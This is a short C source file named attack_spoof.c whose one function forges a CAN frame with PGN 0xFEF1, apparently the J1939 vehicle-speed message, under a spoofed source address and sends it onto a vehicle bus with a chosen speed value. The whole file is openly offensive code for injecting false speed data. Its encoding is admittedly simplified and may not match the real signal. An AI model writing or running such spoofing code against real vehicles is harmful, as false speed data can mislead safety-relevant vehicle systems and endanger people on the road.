// attack_spoof.c
#include "attack_spoof.h"
#include "../common/can_drv.h"

void attack_spoof_speed(unsigned int speed_kmh) {
    frame_t f = {0};
    f.pgn = 0xFEF1;
    f.sa  = 0x11;
    f.len = 8;

    // simple 1 km/h = 1 raw for now
    if (speed_kmh > 255) speed_kmh = 255;
    f.data[0] = (uint8_t)speed_kmh;

    can_send(&f);
}
